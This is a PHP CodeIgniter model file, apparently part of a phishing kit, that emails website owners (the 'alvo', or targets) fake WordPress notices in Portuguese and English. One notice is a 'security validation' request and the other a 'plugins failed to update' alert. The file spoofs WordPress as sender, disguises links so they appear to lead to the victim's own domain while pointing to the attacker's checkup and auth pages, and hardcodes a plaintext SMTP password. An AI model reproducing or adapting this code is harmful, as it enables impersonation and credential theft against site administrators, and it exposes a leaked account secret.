<?php

// use PHPMailer\PHPMailer\PHPMailer;
// use PHPMailer\PHPMailer\SMTP;
// use PHPMailer\PHPMailer\Exception;


require './vendor/autoload.php';


require("./PHPMailer-master/src/PHPMailer.php");
require("./PHPMailer-master/src/SMTP.php");

class email_model extends CI_Model
{

    public function __construct()
    {

        parent::__construct();
    }

    public function sendPayloadOne($alvo_url, $alvo_email, $alvo_nome, $alvo_ref, $alvo_language)
    {


        if ($alvo_language == "pt") {
            try {

                $mail = new PHPMailer\PHPMailer\PHPMailer();
                $mail->IsSMTP(); // enable SMTP
                $mail->CharSet = "UTF-8";
                $mail->SMTPDebug = false; // debugging: 1 = errors and messages, 2 = messages only
                $mail->SMTPAuth = true; // authentication enabled
                $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
                $mail->Host = "smtp.hostinger.com";
                $mail->Port = 465; // or 587
                $mail->IsHTML(true);
                $mail->Username = "wordpress@wpvalidation.com";
                $mail->Password = "Effizienz10*";
                $mail->SetFrom("wordpress@wpvalidation.com", "WordPress");

                $mail->Subject = '[' . $alvo_nome . '] Validação de Segurança';

                $mail->AddAddress($alvo_email, $alvo_nome);


                $mail->Body  = '

            <!DOCTYPE html>
            <html>
            <head>
            
            </head>

            <body>
                   
                    Para sua segurança, o wordpress rotineiramente precisa validar os e-mails associados ao dominio. <a href="https://make.wordpress.org/core/2019/10/17/wordpress-5-3-admin-email-verification-screen/#post-64977">Saiba mais</a>. <br><br>
                                        
                    O e-mail <b>' . $alvo_email . '</b> está associado ao site <b>' . $alvo_url . '</b>?<br><br>

                    Essa validação é importante para evitar que seu site seja removido ou penalizado.<br><br>

                    Acesse o link abaixo para concluir validação:<br><br>

                    <a href="' . base_url() . 'checkup?u=' . $alvo_url . '&e=' . $alvo_email . '&a=' . $alvo_nome . '&lang=pt">https://' . $alvo_url . '/validation=' . $alvo_email . '</a>
                    <br><br>
                    Ou cole direto no navegador: <br><br>
                    ' . base_url() . 'checkup/verification/' . $alvo_ref . '

                </body>
                
            </html>

               ';

                if ($mail->Send()) {
                    return true;
                } else {
                    return false;
                }
            } catch (Exception $e) {
                return false;
            }
        } else if ($alvo_language == "en") {

            try {

                $mail = new PHPMailer\PHPMailer\PHPMailer();
                $mail->IsSMTP();
                $mail->CharSet = "UTF-8";
                $mail->SMTPDebug = false;
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Host = "smtp.hostinger.com";
                $mail->Port = 465;
                $mail->IsHTML(true);
                $mail->Username = "wordpress@wpvalidation.com";
                $mail->Password = "Effizienz10*";
                $mail->SetFrom("wordpress@wpvalidation.com", "WordPress");

                $mail->Subject = '[' . $alvo_nome . '] Security Validation';

                $mail->AddAddress($alvo_email, $alvo_nome);

                $mail->Body = '

                    <!DOCTYPE html>
                    <html>
                    <head>
                    </head>

                    <body>

                        For your security, WordPress periodically verifies the email addresses associated with your domain.
                        <a href="https://make.wordpress.org/core/2019/10/17/wordpress-5-3-admin-email-verification-screen/#post-64977">
                            Learn more
                        </a>.
                        <br><br>

                        Is the email address <b>' . $alvo_email . '</b> associated with the website
                        <b>' . $alvo_url . '</b>?
                        <br><br>

                        This verification is important to help prevent your website from being removed or penalized.
                        <br><br>

                        Click the link below to complete the verification:
                        <br><br>

                        <a href="' . base_url() . 'checkup?u=' . $alvo_url . '&e=' . $alvo_email . '&a=' . $alvo_nome .  '&lang=en">
                            https://' . $alvo_url . '/validation=' . $alvo_email . '
                        </a>

                        <br><br>

                        Or copy and paste the following URL directly into your browser:
                        <br><br>

                        ' . base_url() . 'checkup/verification/' . $alvo_ref . '

                    </body>

                    </html>

                    ';

                if ($mail->Send()) {
                    return true;
                } else {
                    return false;
                }
            } catch (Exception $e) {
                return false;
            }
        }
    }

    public function sendPayloadTwo($alvo_url, $alvo_email, $alvo_nome, $alvo_ref, $alvo_language)
    {

        if ($alvo_language == "pt") {
            try {

                $mail = new PHPMailer\PHPMailer\PHPMailer();
                $mail->IsSMTP(); // enable SMTP
                $mail->CharSet = "UTF-8";
                $mail->SMTPDebug = false; // debugging: 1 = errors and messages, 2 = messages only
                $mail->SMTPAuth = true; // authentication enabled
                $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
                $mail->Host = "smtp.hostinger.com";
                $mail->Port = 465; // or 587
                $mail->IsHTML(true);
                $mail->Username = "wordpress@wpvalidation.com";
                $mail->Password = "Effizienz10*";
                $mail->SetFrom("wordpress@wpvalidation.com", "WordPress");

                $mail->Subject = '[' . $alvo_nome . '] Problema ao atualizar plugins';

                $mail->AddAddress($alvo_email, $alvo_nome);


                $mail->Body  = '

            <!DOCTYPE html>
            <html>
            <head>
            
            </head>

            <body>
                   
                    Olá! Alguns plugins não foram atualizados automaticamente para suas versões mais recentes no seu site em ' . $alvo_url . '. Uma ação adicional pode ser necessária de sua parte.
                    
                    <br><br>
                    
                    Esses plugins não foram atualizados:<br>
                    -  (da versão 1.145.0 para 1.146.0): https://wordpress.org/plugins/<br>
                    -  (da versão 9.6.0 para 9.6.1): https://wordpress.org/plugins/<br>
                    
                    <br><br>
                    
                    Acesse o link abaixo para fazer a atualização manualmente:
                    <br><br>
                    
              
                    <a href="' . base_url() . 'auth?u=' . $alvo_url . '&e=' . $alvo_email . '&a=' . $alvo_nome . '&lang=pt ">https://' . $alvo_url . '/wp-admin/plugins/update/</a>
                    <br><br>
                    
                    Se você tiver algum problema ou precisar de suporte, os voluntários nos fóruns de suporte do WordPress.org podem ajudar.
                    https://wordpress.org/support/forums/
                    <br><br>
                    
                    A equipe do WordPress

                </body>
                
            </html>

               ';

                if ($mail->Send()) {
                    return true;
                } else {
                    return false;
                }
            } catch (Exception $e) {
                return false;
            }
        } else if ($alvo_language == "en") {

            try {

                $mail = new PHPMailer\PHPMailer\PHPMailer();
                $mail->IsSMTP(); // enable SMTP
                $mail->CharSet = "UTF-8";
                $mail->SMTPDebug = false; // debugging: 1 = errors and messages, 2 = messages only
                $mail->SMTPAuth = true; // authentication enabled
                $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
                $mail->Host = "smtp.hostinger.com";
                $mail->Port = 465; // or 587
                $mail->IsHTML(true);
                $mail->Username = "wordpress@wpvalidation.com";
                $mail->Password = "Effizienz10*";
                $mail->SetFrom("wordpress@wpvalidation.com", "WordPress");

                $mail->Subject = '[' . $alvo_nome . '] Problem updating plugins';

                $mail->AddAddress($alvo_email, $alvo_nome);


                $mail->Body  = '

                                <!DOCTYPE html>
                                <html>
                                <head>
                                
                                </head>

                                <body>
                                    
                                        Hello! Some plugins were not automatically updated to their latest versions on your site at ' . $alvo_url . '. Additional action may be required on your part.
                                        
                                        <br><br>
                                        
                                        These plugins were not updated:<br>
                                        -  (from version 1.145.0 to 1.146.0): https://wordpress.org/plugins/<br>
                                        -  (from version 9.6.0 to 9.6.1): https://wordpress.org/plugins/<br>
                                        
                                        <br><br>
                                        
                                        Please visit the link below to update them manually:
                                        <br><br>
                                        
                                
                                    <a href="' . base_url() . 'auth?u=' . $alvo_url . '&e=' . $alvo_email . '&a=' . $alvo_nome . '&lang=en">https://' . $alvo_url . '/wp-admin/plugins/update/</a>
                                        <br><br>
                                        
                                        If you experience any issues or need support, volunteers in the WordPress.org support forums can help.
                                        https://wordpress.org/support/forums/
                                        <br><br>
                                        
                                        The WordPress Team

                                    </body>
                                    
                                </html>

                        ';

                if ($mail->Send()) {
                    return true;
                } else {
                    return false;
                }
            } catch (Exception $e) {
                return false;
            }
        }
    }
}
